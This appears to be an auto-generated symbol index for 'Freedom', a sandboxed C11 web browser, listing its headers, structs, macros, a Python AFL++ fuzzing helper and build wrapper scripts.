- `hls_segment` (line 29) - *or variant info. URLs are returned as they appear in the playlist (may be relative to the playlist's base URL).  See spec/hls.md for the full contract.  typedef enum hls_status { HLS_OK = 0, HLS_ERR_NULL_ARG, HLS_ERR_PARSE,      /* not a valid m3u8 playlist HLS_ERR_OOM } hls_status; /* One segment in the playlist.*
- `hls_variant` (line 36) - *HLS_OK = 0, HLS_ERR_NULL_ARG, HLS_ERR_PARSE,      /* not a valid m3u8 playlist HLS_ERR_OOM } hls_status; /* One segment in the playlist. typedef struct hls_segment { char  *url;          /* owned; the raw segment URL as written in the playlist size_t url_len; double duration;     /* segment duration in seconds (from #EXTINF) } hls_segment; /* One variant (quality tier) in a multi-variant (master) playlist.*
- `hls_playlist` (line 45) - *size_t url_len; double duration;     /* segment duration in seconds (from #EXTINF) } hls_segment; /* One variant (quality tier) in a multi-variant (master) playlist. typedef struct hls_variant { char  *url;          /* owned; the variant playlist URL size_t url_len; long   bandwidth;    /* BANDWIDTH from #EXT-X-STREAM-INF, or 0 if absent int    width;        /* RESOLUTION width, or 0 int    height;       /* RESOLUTION height, or 0 } hls_variant; /* Parsed playlist.*

#### `hostblock.h`
**Path:** `include/hostblock.h`
**File Doc:** *ifndef FREEDOM_HOSTBLOCK_H define FREEDOM_HOSTBLOCK_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_HOSTBLOCK_H` (line 2)

#### `hostedit.h`
**Path:** `include/hostedit.h`
**File Doc:** *ifndef FREEDOM_HOSTEDIT_H define FREEDOM_HOSTEDIT_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_HOSTEDIT_H` (line 2)
- `HE_MAX_HOST` (line 32)

#### `html_parse.h`
**Path:** `include/html_parse.h`
**File Doc:** *ifndef FREEDOM_HTML_PARSE_H define FREEDOM_HTML_PARSE_H  include <stddef.h> include <stdint.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_HTML_PARSE_H` (line 2)
- `HP_DEFAULT_MAX_BYTES` (line 40)
- `HP_MAX_SCRIPTS` (line 48)
- `HP_MAX_STYLESHEETS` (line 110)

**Structs:**
- `hp_config` (line 32)
- `hp_script` (line 76) - *One executable <script>. Inline: text is a NUL-terminated buffer of `len` bytes (the NUL is not counted in len) and src == NULL. External: src is the RAW, unresolved value of the src attribute (hostile input; the parser never fetches) * and text == NULL. Both buffers are owned by the hp_script array.*

#### `image_decode.h`
**Path:** `include/image_decode.h`
**File Doc:** *ifndef FREEDOM_IMAGE_DECODE_H define FREEDOM_IMAGE_DECODE_H  include <stddef.h> include <stdint.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_IMAGE_DECODE_H` (line 2)
- `IMG_MAX_DIM` (line 65)
- `IMG_MAX_PIXELS` (line 66)

**Structs:**
- `img_pixels` (line 56) - *A decoded bitmap that owns its pixel buffer. The pixel format is Cairo's native premultiplied ARGB32: each pixel is a uint32_t 0xAARRGGBB, i.e. bytes B,G,R,A in little-endian memory, colour premultiplied by alpha. stride == width*4 (tightly packed). This module never includes cairo.h; it only honours that layout so the * parent can wrap data in a cairo_surface_t without re-encoding.*

#### `js_dom.h`
**Path:** `include/js_dom.h`
**File Doc:** *ifndef FREEDOM_JS_DOM_H define FREEDOM_JS_DOM_H  include "dom.h" include "freebug.h" include "js_sandbox.h" include "url.h"  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_JS_DOM_H` (line 2)

**Structs:**
- `jd_opaque` (line 35)

#### `js_env.h`
**Path:** `include/js_env.h`
**File Doc:** *ifndef FREEDOM_JS_ENV_H define FREEDOM_JS_ENV_H  include "js_sandbox.h"  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_JS_ENV_H` (line 2)

#### `js_policy.h`
**Path:** `include/js_policy.h`
**File Doc:** *ifndef FREEDOM_JS_POLICY_H define FREEDOM_JS_POLICY_H  include <stdbool.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_JS_POLICY_H` (line 2)

#### `js_sandbox.h`
**Path:** `include/js_sandbox.h`
**File Doc:** *ifndef FREEDOM_JS_SANDBOX_H define FREEDOM_JS_SANDBOX_H  include <stddef.h> include <stdint.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_JS_SANDBOX_H` (line 2)
- `JS_LOC_FILE_MAX` (line 64)
- `JS_DEFAULT_MAX_SOURCE` (line 65)
- `JS_DEFAULT_MEM_LIMIT` (line 67)
- `JS_DEFAULT_STACK_LIMIT` (line 68)
- `JS_DEFAULT_TIME_BUDGET` (line 69)

**Structs:**
- `js_limits` (line 39) - *Per-evaluation resource limits. A field set to 0 receives that field's * default: "no limit" is deliberately not representable (secure by default).*
- `js_result` (line 49)

#### `link_nav.h`
**Path:** `include/link_nav.h`
**File Doc:** *ifndef FREEDOM_LINK_NAV_H define FREEDOM_LINK_NAV_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_LINK_NAV_H` (line 2)
- `LN_MAX_TARGET` (line 33)
- `LN_MAX_FRAGMENT` (line 38)

**Structs:**
- `ln_result` (line 62)

#### `local_store.h`
**Path:** `include/local_store.h`
**File Doc:** *ifndef FREEDOM_LOCAL_STORE_H define FREEDOM_LOCAL_STORE_H  include <stddef.h> include <stdint.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_LOCAL_STORE_H` (line 2)
- `LS_KEY_LEN` (line 25)
- `LS_SALT_LEN` (line 27)
- `LS_NONCE_LEN` (line 28)
- `LS_TAG_LEN` (line 29)
- `LS_HEADER_LEN` (line 30)
- `LS_OVERHEAD` (line 31)
- `LS_MAX_PLAINTEXT` (line 32)

#### `media_decoder.h`
**Path:** `include/media_decoder.h`
**File Doc:** *ifndef FREEDOM_MEDIA_DECODER_H define FREEDOM_MEDIA_DECODER_H  include <stddef.h> include <stdint.h> include <sys/types.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_MEDIA_DECODER_H` (line 2)
- `MD_MAX_SEGMENT_BYTES` (line 43)

#### `net_realm.h`
**Path:** `include/net_realm.h`
**File Doc:** *ifndef FREEDOM_NET_REALM_H define FREEDOM_NET_REALM_H  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_NET_REALM_H` (line 2)

**Structs:**
- `nr_config` (line 42)

#### `os_sandbox.h`
**Path:** `include/os_sandbox.h`
**File Doc:** *ifndef FREEDOM_OS_SANDBOX_H define FREEDOM_OS_SANDBOX_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_OS_SANDBOX_H` (line 2)

**Structs:**
- `os_fs_rule` (line 108)

#### `page_view.h`
**Path:** `include/page_view.h`
**File Doc:** *ifndef FREEDOM_PAGE_VIEW_H define FREEDOM_PAGE_VIEW_H  include <stddef.h> include <stdint.h>  include "dom.h" include "html_parse.h"  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_PAGE_VIEW_H` (line 2)
- `PV_LEN_UNSET` (line 42)
- `PV_GRID_TRACKS` (line 45)

**Structs:**
- `pv_run` (line 89) - *One inline run in document order. text is owned, NUL-terminated, valid UTF-8 (the alt text for PV_IMAGE, possibly empty). href is owned and NUL-terminated for PV_LINK runs, NULL otherwise. src is owned and NUL-terminated for PV_IMAGE runs (the image URL, data with provenance, never fetched here), NULL otherwise; img_w/img_h carry the declared <img> dimensions in pixels, or -1 when unknown. An image is never a link, so href and src are never both set. fg_rgb carries the author foreground color (nearest inline style "color:" or <font color>) packed as 0xRRGGBB, or -1 when none/unparseable; it is presentation data the renderer * applies only when author CSS is enabled.*
- `pv_box_def` (line 273) - *Box engine (Hito 23b-8 Step D): one entry of the box-definition TREE. The box decoration and the parent link live here, not on each run, so a box is described once (extinguishing the Step A per-run duplication) and a TEXT-LESS wrapper box (one that owns no direct run, e.g. a card div whose only child is a body div) is still representable. A box's block_id IS its index in pv_view.boxes; a run carries only its block_id (which box it belongs to) and finds its parent via boxes[block_id].parent_id. parent_id is the block_id of the nearest box-carrying block ancestor, or -1 for a root box. The decoration fields mirror the Step A sentinels exactly (border widths/radius/outline width PV_LEN_UNSET, colors -1, the rest 0). The whole list is author presentation: render_doc copies it only with * caps.css (empty otherwise -> default render byte-identical).*
- `pv_view` (line 373)
- `pv_text_ext` (line 501) - *The author text-presentation extensions of one run, resolved from the nearest ancestor that sets each field (they all inherit in CSS). The 20+ fields used to be positional parameters of pv_set_text_ext -- a signature that grew with every property batch; the struct is the contract now. list_style is resolved here too but is NOT a run field: page_view bakes the <li> marker into the run text (structure), so pv_set_text_ext ignores it. Initialise with pv_text_ext_reset * (every field to its "unset" sentinel), then set what the caller resolved.*

#### `pdf_export.h`
**Path:** `include/pdf_export.h`
**File Doc:** *ifndef FREEDOM_PDF_EXPORT_H define FREEDOM_PDF_EXPORT_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_PDF_EXPORT_H` (line 2)
- `PE_NAME_MAX` (line 27)
- `PE_EXT` (line 29)
- `PE_EXT_PNG` (line 30)
- `PE_FALLBACK_NAME` (line 31)

#### `prefetch.h`
**Path:** `include/prefetch.h`
**File Doc:** *ifndef FREEDOM_PREFETCH_H define FREEDOM_PREFETCH_H  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif  include <stddef.h> include <pthread.h>*

**Macros:**
- `FREEDOM_PREFETCH_H` (line 2)
- `PF_MAX_REFS` (line 46)
- `PF_MAX_THREADS` (line 48)

**Structs:**
- `pf_ref` (line 42) - *One scanned reference. url is the RAW attribute value (the policy-gated fetcher * resolves and validates it, exactly as it does for the worker's own request).*
- `pf_list` (line 50)
- `pf_job` (line 77)
- `pf_pool` (line 87)
- `pf_gated_fetch` (line 129) - *Cache-first fetcher adapter, shared by every frontend (DRY): install pf_pooled_fetch as the tab fetcher with a pf_gated_fetch as its ctx. A GET whose URL is pooled is served from the pool (a failed prefetch propagates the failure -- never refetched); everything else (POST, miss, pool == NULL) goes straight to the inner policy-gated fetcher. The pf_gated_fetch must outlive * the tab_load_full call; reset the tab's fetcher to the inner one afterwards.*

#### `prefs.h`
**Path:** `include/prefs.h`
**File Doc:** *ifndef FREEDOM_PREFS_H define FREEDOM_PREFS_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_PREFS_H` (line 2)
- `PREFS_VERSION` (line 25)
- `PREFS_MAX_URL` (line 27)
- `PREFS_MAX_TITLE` (line 28)
- `PREFS_MAX_BOOKMARKS` (line 29)
- `PREFS_MAX_HISTORY` (line 30)
- `PREFS_MAX_TEXT` (line 31)
- `PREFS_PAGE_HISTORY` (line 34)

**Structs:**
- `prefs_entry` (line 45)
- `prefs_state` (line 50)

#### `profile.h`
**Path:** `include/profile.h`
**File Doc:** *ifndef FREEDOM_PROFILE_H define FREEDOM_PROFILE_H  include <stddef.h> include <stdint.h>  include "local_store.h" include "prefs.h"  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_PROFILE_H` (line 2)
- `PROFILE_KEY_FILE` (line 31)
- `PROFILE_PREFS_FILE` (line 33)

**Structs:**
- `profile_ctx` (line 46)

#### `psl_data.h`
**Path:** `include/psl_data.h`
**File Doc:** *ifndef FREEDOM_PSL_DATA_H define FREEDOM_PSL_DATA_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_PSL_DATA_H` (line 2)

#### `render_doc.h`
**Path:** `include/render_doc.h`
**File Doc:** *ifndef FREEDOM_RENDER_DOC_H define FREEDOM_RENDER_DOC_H  include <stddef.h>  include "page_view.h" include "render_policy.h"  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_RENDER_DOC_H` (line 2)

**Structs:**
- `rd_block` (line 60) - *One paint-ready block in document order. text is owned, NUL-terminated and valid UTF-8. href is owned and NUL-terminated for RD_LINK (link target), RD_IMAGE (image src) and RD_INPUT (the owning form's action); NULL otherwise. img_decision is meaningful only for RD_IMAGE. The input_* fields are meaningful only for RD_INPUT: input_type is a pv_input_type; name/value are owned (NULL when absent) and carry the submitted bytes verbatim; form_id groups controls of one * form (-1 = none); form_method is a pv_form_method.*
- `rd_doc` (line 180)

#### `render_policy.h`
**Path:** `include/render_policy.h`
**File Doc:** *ifndef FREEDOM_RENDER_POLICY_H define FREEDOM_RENDER_POLICY_H  include <stdbool.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_RENDER_POLICY_H` (line 2)
- `RDP_TRACKER_MAX_DIM` (line 27)

**Structs:**
- `rdp_caps` (line 32) - *Render capabilities for a page. The zero value ({0}) is the safe baseline: every rich/risky capability off. The only way to opt in is to set a field to * true explicitly, which keeps every opt-in auditable.*

#### `renderer.h`
**Path:** `include/renderer.h`
**File Doc:** *ifndef FREEDOM_RENDERER_H define FREEDOM_RENDERER_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_RENDERER_H` (line 2)
- `RD_MAX_INPUT` (line 36)
- `RD_MAX_FIELD` (line 38)

**Structs:**
- `rd_result` (line 29)

#### `request_policy.h`
**Path:** `include/request_policy.h`
**File Doc:** *ifndef FREEDOM_REQUEST_POLICY_H define FREEDOM_REQUEST_POLICY_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_REQUEST_POLICY_H` (line 2)

#### `secure_fetch.h`
**Path:** `include/secure_fetch.h`
**File Doc:** *ifndef FREEDOM_SECURE_FETCH_H define FREEDOM_SECURE_FETCH_H  include <stddef.h> include <stdint.h>  include "anti_fp.h" /* normalized network identity (User-Agent / Accept-Language) */  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_SECURE_FETCH_H` (line 2)
- `SF_DEFAULT_KEX_GROUPS` (line 143)
- `SF_IMPERSONATE_KEX_GROUPS` (line 152)
- `SF_IMPERSONATE_TLS13_CIPHERS` (line 153)
- `SF_IMPERSONATE_TLS12_CIPHERS` (line 157)
- `SF_DEFAULT_USER_AGENT` (line 168)
- `SF_DEFAULT_MAX_BODY` (line 169)
- `SF_DEFAULT_TIMEOUT_MS` (line 170)
- `SF_DEFAULT_MAX_REDIRECTS` (line 171)
- `SF_MAX_URL` (line 172)

**Structs:**
- `sf_chain_info` (line 60) - *Minimal view of the verified certificate chain, used by sf_check_chain_policy. * Kept as plain data so the policy check is a pure, directly testable function.*
- `sf_config` (line 75)
- `sf_response` (line 117)

#### `tab.h`
**Path:** `include/tab.h`
**File Doc:** *ifndef FREEDOM_TAB_H define FREEDOM_TAB_H  include <stddef.h> include <stdint.h> include <sys/types.h>  include "freebug.h" include "page_view.h"  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_TAB_H` (line 2)
- `TAB_MAX_INPUT` (line 100)

**Structs:**
- `tab_page` (line 49) - *Inert result of loading a page: title + extracted text + structured display list (all owned). text is kept for headless/plain output; view carries the * inline runs (headings, links, block breaks) the GUI lays out and paints.*
- `tab_eval_result` (line 80) - *The page's document.cookie jar after the scripts ran ("name=value; ..."), or NULL when the jar was disabled (untrusted host) or empty. The trusted parent folds it back into the ephemeral network jar so JS-set session cookies reach the next request. In-memory only; never persisted (Zero Knowledge). Owned; freed by * tab_page_free. char    *set_cookies; } tab_page; /* Result of evaluating script: the value, or a JS error message.*
- `tab_image` (line 93) - *Pixels of a decoded image, produced inside the confined worker. data is owned and holds premultiplied ARGB32 (Cairo's CAIRO_FORMAT_ARGB32 layout: bytes B,G,R,A; stride == width*4). data == NULL means the worker could not decode the * bytes (not a PNG, corrupt, or out of bounds): the caller shows the placeholder.*

#### `text_shape.h`
**Path:** `include/text_shape.h`

**Macros:**
- `FREEDOM_TEXT_SHAPE_H` (line 19)
- `TSH_MAX_GLYPHS` (line 35)
- `TSH_MAX_TEXT` (line 37)

**Structs:**
- `tsh_font` (line 30) - *Font selector: a css_font_family bucket (CSS_FF_*) plus weight/slant flags. * The engine matches the generic group only, never an exact author family.*

#### `textfield.h`
**Path:** `include/textfield.h`
**File Doc:** *ifndef FREEDOM_TEXTFIELD_H define FREEDOM_TEXTFIELD_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_TEXTFIELD_H` (line 2)
- `TF_CAP` (line 22)

**Structs:**
- `tf_field` (line 25)

#### `tls_impersonate.h`
**Path:** `include/tls_impersonate.h`
**File Doc:** *ifndef FREEDOM_TLS_IMPERSONATE_H define FREEDOM_TLS_IMPERSONATE_H  include <stddef.h> include <stdint.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_TLS_IMPERSONATE_H` (line 2)
- `TI_MAGIC` (line 56)
- `TI_MAX_URL` (line 57)
- `TI_MAX_METHOD` (line 58)
- `TI_MAX_HEADERS` (line 59)
- `TI_MAX_BODY` (line 60)
- `TI_MAX_RESP_HDR` (line 61)
- `TI_MAX_RESP_BODY` (line 62)
- `TI_MAX_CHAIN` (line 63)
- `TI_MAX_GROUP` (line 64)

**Structs:**
- `ti_req` (line 68) - *Request: parent -> helper. Pointers are borrowed by ti_encode_req (not copied); * ti_decode_req allocates its own copies, released by ti_req_free.*
- `ti_resp` (line 78) - *Request: parent -> helper. Pointers are borrowed by ti_encode_req (not copied); * ti_decode_req allocates its own copies, released by ti_req_free. typedef struct ti_req { const char   *url;        /* https only on this route (bounded TI_MAX_URL) const char   *method;     /* "GET" / "POST" (bounded TI_MAX_METHOD) const char   *headers;    /* CRLF-joined, already normalized by the parent const uint8_t *body; size_t        body_len; ti_profile    profile; } ti_req; /* Response: helper -> parent. ti_decode_resp allocates; ti_resp_free releases.*

#### `ui.h`
**Path:** `include/ui.h`
**File Doc:** *ifndef FREEDOM_UI_H define FREEDOM_UI_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_UI_H` (line 2)

**Structs:**
- `ui_line` (line 29) - *A laid-out line is a contiguous slice [offset, offset+len) of the source * text (no copy): render with text + offset over len bytes.*
- `ui_layout` (line 34)
- `rd_doc` (line 68)
- `tab` (line 94)

#### `url.h`
**Path:** `include/url.h`
**File Doc:** *ifndef FREEDOM_URL_H define FREEDOM_URL_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_URL_H` (line 2)
- `URL_MAX_LEN` (line 30)
- `URL_SEARCH_ENDPOINT` (line 76)

**Structs:**
- `url_parts` (line 129) - *Components of a validated absolute https URL, sliced for a JS location object. Every field ALIASES the input url (not owned, valid while url is alive); lengths exclude any NUL. Absent components have length 0. pathname is the literal path * span and is empty when the URL has no path (the location shim presents "" as "/").*

#### `util.h`
**Path:** `include/util.h`
**File Doc:** *util.h — shared pure helpers (no I/O except where noted). Static inline so each compilation unit gets its own copy without adding link dependencies.*

**Functions:**
- `write_full` (line 13) `static inline int write_full(int fd, const void *buf, size_t n)` - *util.h — shared pure helpers (no I/O except where noted). Static inline so each * compilation unit gets its own copy without adding link dependencies. #ifndef UTIL_H #define UTIL_H #include <stddef.h> #include <stdint.h> #include <unistd.h> #include <errno.h> /* --- framed pipe I/O (EINTR-safe, all-or-nothing) ---*
- `read_full` (line 24) `static inline int read_full(int fd, void *buf, size_t n)`
- `utf8_seq_len` (line 38) `static inline size_t utf8_seq_len(unsigned char c)` - *static inline int read_full(int fd, void *buf, size_t n) { uint8_t *p = (uint8_t *)buf; size_t got = 0; while (got < n) { ssize_t r = read(fd, p + got, n - got); if (r < 0) { if (errno == EINTR) continue; return -1; } if (r == 0) return -1; /* unexpected EOF got += (size_t)r; } return 0; } /* --- UTF-8 lead-byte length table ---*
- `fnv1a` (line 48) `static inline uint64_t fnv1a(const char *s, size_t n)` - *return 0; } /* --- UTF-8 lead-byte length table --- static inline size_t utf8_seq_len(unsigned char c) { if (c < 0x80) return 1; if (c >= 0xC2 && c <= 0xDF) return 2; if (c >= 0xE0 && c <= 0xEF) return 3; if (c >= 0xF0 && c <= 0xF4) return 4; return 0; } /* --- FNV-1a 64-bit hash ---*

**Macros:**
- `UTIL_H` (line 5)

#### `webcaps.h`
**Path:** `include/webcaps.h`
**File Doc:** *ifndef FREEDOM_WEBCAPS_H define FREEDOM_WEBCAPS_H  include <stdbool.h>  include "js_policy.h" include "render_policy.h"  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_WEBCAPS_H` (line 2)

**Structs:**
- `wc_caps` (line 38) - *Full capability table for one page. The zero value ({0}) is the safe baseline: every capability off. Only an explicit derivation turns a field on, keeping every * opt-in auditable.*
- `wc_input` (line 57) - *Per-host derivation inputs (GUI path). host_in_js / host_in_allow are nonzero iff the page host is on js.conf / allow.conf (e.g. hb_is_allowlisted, subdomain-aware). user_css / user_images are the user's session toggles; reader is distraction-free * (reader) mode.*

#### `zoom.h`
**Path:** `include/zoom.h`
**File Doc:** *ifndef FREEDOM_ZOOM_H define FREEDOM_ZOOM_H  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_ZOOM_H` (line 2)
- `ZM_MIN_PCT` (line 20)
- `ZM_MAX_PCT` (line 22)
- `ZM_DEFAULT_PCT` (line 23)

### JS (1 files)

#### `jq_test.js`
**Path:** `tmp/jq_test.js`
**File Doc:** *! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license*

**Functions:**
- `E` (line 2) - */*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license*
- `k` (line 2) - */*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license*
- `z` (line 2) - */*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license*
- `Y` (line 2) - */*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license*
- `r` (line 2) - */*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license*
- `n` (line 2) - */*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license*

### PY (1 files)

#### `app.py`
**Path:** `app.py`
**File Doc:** *_*_ coding: utf8 _*_*

**Functions:**
- `read_fuzz_stats` (line 30) `def read_fuzz_stats()` - *Reads the current status of the active AFL++ fuzzing session.*
- `list_unique_crashes` (line 39) `def list_unique_crashes()` - *Lists all unique crash files generated by the fuzzer that broke the browser.*
- `run_freedom_headless` (line 47) `def run_freedom_headless(payload_path)` - *Executes the FreeDom browser in headless mode against a specific file input or mutated seed.

Args:
    payload_path: The relative or absolute path to the HTML/JS file to process (e.g., 'fuzz/in/seed.html').*

### SH (6 files)

#### `build_deb.sh`
**Path:** `build_deb.sh`
**File Doc:** *Thin wrapper. The .deb build lives in the Makefile (single source of truth) and also restores build/ ownership afterwards (debuild runs under fakeroot/sudo and would otherwise leave build/ root-owned).*

*No symbols extracted*

#### `docker-entrypoint.sh`
**Path:** `docker-entrypoint.sh`

*No symbols extracted*

#### `docker_run.sh`
**Path:** `docker_run.sh`
**File Doc:** *Thin wrapper. The docker build/run lives in the Makefile (single source of truth).*

*No symbols extracted*

#### `fuzz.sh`
**Path:** `fuzz.sh`
**File Doc:** *Thin wrapper. The fuzz build/run logic now lives in the Makefile (single source of truth), so it can never drift from the real build the way this script used to. make fuzz-afl   -> AFL++ over the full headless pipeline (this script) make fuzz       -> libFuzzer over the HTML parser make fuzz-pv    -> libFuzzer over the display-list builder (page_view) make fuzz-js    -> libFuzzer over the JS sandbox make fuzz-img   -> libFuzzer over the PNG decoder*

*No symbols extracted*

#### `install.sh`
**Path:** `install.sh`
**File Doc:** *Exit immediately if a command exits with a non-zero status, if an undefined variable is used, or if any pipe fails.*

*No symbols extracted*

#### `run_freedom.sh`
**Path:** `run_freedom.sh`
**File Doc:** *Thin wrapper. Launches a nested weston (for boxes without a Wayland session), then runs the browser through the Makefile (single source of truth for the build). Usage: ./run_freedom.sh [url]*

*No symbols extracted*
